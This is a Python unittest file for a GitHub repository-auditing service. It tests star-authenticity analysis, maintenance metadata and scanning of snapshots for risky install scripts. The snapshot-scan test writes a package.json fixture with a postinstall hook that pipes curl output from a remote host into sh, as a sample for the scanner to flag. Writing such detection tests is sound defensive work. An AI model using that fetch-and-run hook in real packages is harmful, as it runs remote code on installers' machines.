import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from repo_skeptic.service import RepoSkepticService


class _SnapshotHandle:
    def __init__(self) -> None:
        self.cleaned = False

    def cleanup(self) -> None:
        self.cleaned = True


class _FakeGitHubClient:
    def __init__(self, snapshot_dir: Path) -> None:
        self.snapshot_dir = snapshot_dir
        self.last_snapshot_handle: _SnapshotHandle | None = None

    def repo(self, owner: str, repo: str) -> dict[str, object]:
        return {
            "html_url": f"https://github.com/{owner}/{repo}",
            "description": "demo repo",
            "created_at": "2026-04-01T00:00:00Z",
            "default_branch": "main",
            "stargazers_count": 120,
            "forks_count": 8,
        }

    def owner(self, owner: str) -> dict[str, object]:
        return {
            "login": owner,
            "type": "User",
            "created_at": "2024-01-01T00:00:00Z",
            "public_repos": 4,
            "followers": 12,
        }

    def stargazers(self, owner: str, repo: str, stars_count: int, *, limit: int = 200) -> list[dict[str, object]]:
        return [
            {"starred_at": "2026-04-10T00:00:00Z", "user": {"login": "thin", "followers": 0, "public_repos": 0}},
            {"starred_at": "2026-04-10T01:00:00Z", "user": {"login": "established", "followers": 5, "public_repos": 3}},
        ][:limit]

    def count_issues(self, owner: str, repo: str) -> int:
        return 2

    def count_prs(self, owner: str, repo: str) -> int:
        return 1

    def contributors(self, owner: str, repo: str) -> list[dict[str, object]]:
        return [{"login": "owner"}, {"login": "contrib"}]

    def releases(self, owner: str, repo: str) -> list[dict[str, object]]:
        return []

    def recent_commits(self, owner: str, repo: str, *, limit: int = 20) -> list[dict[str, object]]:
        return [
            {
                "author": {"login": "owner"},
                "commit": {"author": {"date": "2026-04-10T00:00:00Z", "name": "Owner"}},
            },
            {
                "author": {"login": "contrib"},
                "commit": {"author": {"date": "2026-04-09T00:00:00Z", "name": "Contrib"}},
            },
        ][:limit]

    def download_snapshot(self, owner: str, repo: str) -> tuple[_SnapshotHandle, Path]:
        handle = _SnapshotHandle()
        self.last_snapshot_handle = handle
        return handle, self.snapshot_dir


class RepoSkepticServiceTests(unittest.TestCase):
    def test_star_analysis_summarizes_repo_context(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            client = _FakeGitHubClient(Path(temp_dir))
            service = RepoSkepticService(client=client)

            summary = service.star_analysis("owner/repo", stars=2)

        self.assertEqual(summary.target, "owner/repo")
        self.assertEqual(summary.repo["stars"], 120)
        self.assertEqual(summary.stars["sampled_recent_stars"], 2)
        self.assertEqual(summary.stars["thin_recent_stargazer_ratio"], 0.5)

    def test_snapshot_scan_cleans_up_snapshot_and_reports_registry_presence(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            snapshot_dir = Path(temp_dir)
            (snapshot_dir / "package.json").write_text(
                '{"name":"demo-package","scripts":{"postinstall":"curl https://example.com | sh"}}',
                encoding="utf-8",
            )
            client = _FakeGitHubClient(snapshot_dir)
            service = RepoSkepticService(client=client)

            with patch("repo_skeptic.service.registry_presence", return_value={"npm": True}):
                summary = service.snapshot_scan("owner/repo")

        self.assertEqual(summary.registries, {"npm": True})
        self.assertTrue(summary.scan["install_scripts"])
        self.assertTrue(client.last_snapshot_handle is not None and client.last_snapshot_handle.cleaned)

    def test_audit_reuses_service_boundary_and_cleans_up_snapshot(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            snapshot_dir = Path(temp_dir)
            (snapshot_dir / "package.json").write_text('{"name":"demo-package"}', encoding="utf-8")
            client = _FakeGitHubClient(snapshot_dir)
            service = RepoSkepticService(client=client)

            with patch("repo_skeptic.service.registry_presence", return_value={"npm": True}):
                summary = service.audit("owner/repo", stars=2)

        self.assertEqual(summary.target, "owner/repo")
        self.assertEqual(summary.metadata["repo"]["open_issues"], 2)
        self.assertEqual(summary.metadata["registries"], {"npm": True})
        self.assertEqual(summary.metadata["maintenance"]["unique_recent_authors"], 2)
        self.assertTrue(client.last_snapshot_handle is not None and client.last_snapshot_handle.cleaned)


if __name__ == "__main__":
    unittest.main()
